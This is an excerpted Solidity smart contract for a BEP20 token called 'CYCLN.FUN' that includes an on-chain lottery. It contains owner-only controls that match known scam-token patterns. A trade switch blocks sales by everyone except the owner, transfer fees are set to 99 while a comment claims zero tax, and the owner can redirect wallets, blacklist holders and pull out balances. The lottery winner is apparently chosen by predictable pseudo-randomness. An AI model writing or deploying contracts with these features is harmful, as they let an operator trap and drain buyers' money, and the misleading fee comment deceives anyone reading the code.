...
contract CYCLNFUN is Context, IBEP20, Ownable {
    ...
    string private constant _name     = "CYCLN.FUN";
    string private constant _symbol   = "CYC";
    uint8  private constant _decimals = 9;
    
    uint256 private  _percentageOfLiquidityForLottery       = 500; //LP tax is whatever is left remaining of 10,000, if marketing is 4000 and Lottery is 4000, auto LP would be 2000
    uint256 private  _percentageOfLiquidityForMarketing = 6500;
    uint256 public  _taxlottery       = 5; // tax fee is reflections

    // transfer fee
    uint256 public  _taxFee       = 99; // tax fee is reflections
    uint256 public  _liquidityFee = 99; // ZERO tax for transfering tokens
    bool public _trade = true;
  bool public _lotteryOpen = false;
    ...
    constructor () {
        ...
        // 
        _marketingWallet = 0xA4771Da6370784B7528b418F5D00507989406E25;
...
//Remove from Blacklist 
    ...
    function setMaxTx(uint256 maxTx) external onlyOwner {
     ...
     function setTaxLottery(uint256 maxTx) external onlyOwner {
        _taxlottery = maxTx;
    }
     function setBid(uint256 maxTx) external onlyOwner {
        minBid = maxTx;
    }
    ...
    function setTrade(bool e) external onlyOwner {
        _trade = e;
    }
     function setLottery(bool e) external onlyOwner {
        _lotteryOpen = e;
    }
    ...
    function setAddresses(address LotteryWallet, address marketingWallet) external onlyOwner {
        _LotteryWallet       = LotteryWallet;
        _marketingWallet = marketingWallet;
    }

    function setLiquidityPercentages(uint256 LotteryFee, uint256 marketingFee) external onlyOwner {
    ...
    function _transfer(
        ...
        if(isSell)
            require(_trade || msg.sender == owner() || msg.sender == address(uniswapV2Router) , "Trade not open");
        ...
        if(_lotteryOpen){
            ...
            if(block.timestamp<=end){
                ...
                uint256 amountBNB = address(this).balance;
                  payable(_gamers[randMod()]).transfer(amountBNB * _taxlottery  / 100);
                    reset();
...
function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        uint256 bnbForLiquidity = newBalance - bnbForLottery - bnbForMarketing;

        if ( bnbForLottery != 0 ) {
            emit LotterySent(_LotteryWallet, bnbForLottery);
            payable(address(this)).transfer(bnbForLottery);
        }
...
//adding multiple addresses to the blacklist - Used to manually block known bots and scammers
    ...
    address [] private _gamers;
    address [] private _gamers2;
    uint256 public minBid =200;  
    uint256 public delay = 60; 
    uint start;
    uint end;
    ...
    function buy() public  {
         uint id = _gamers.length;
        arrayIndexes[msg.sender] = id;
        _gamers.push(msg.sender);
     
        arrayIndexes[msg.sender] = 99;
     ...
     function playerPlay() public view returns (bool){
          for (uint i = 0; i < _gamers.length; i++){
        if(_gamers[i] == msg.sender)
          return true;
    }
        return false;
    }
    function numberOfGamer() public view returns (uint256){
        return _gamers.length;
    }
